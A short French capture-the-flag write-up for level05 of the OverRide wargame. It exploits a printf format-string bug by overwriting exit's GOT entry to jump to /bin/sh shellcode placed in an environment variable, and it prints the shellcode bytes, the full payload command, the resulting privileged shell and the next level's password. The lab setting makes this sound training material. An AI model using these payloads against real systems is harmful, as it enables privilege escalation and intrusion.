En desassemblant le code on voit qu'il ya la possibilité d'analyser la memoire avec une faille format string sur le printf.

Ce que l'on va faire c'est réecrire l'adresse de la fonction exit pour qu'elle pointe sur notre shellcode que l'on aura mis dans l'environnement

```bash
level05@OverRide:~$ export SC=$(python -c "print('\x90' * 42 + '\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x68\x2f\x73\x68\x31\x80\x74\x24\x03\x31\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80')")
``

L'adresse -> 0xffffdea7

L'adresse de exit dans le GOT -> 0x80497e0

On construis notre payload

```bash
level05@OverRide:~$ (python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56991d' + '%10\$n' + '%8536d' + '%11\$n')"; cat) | ./level05
...
...
...
...
4415680
id
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
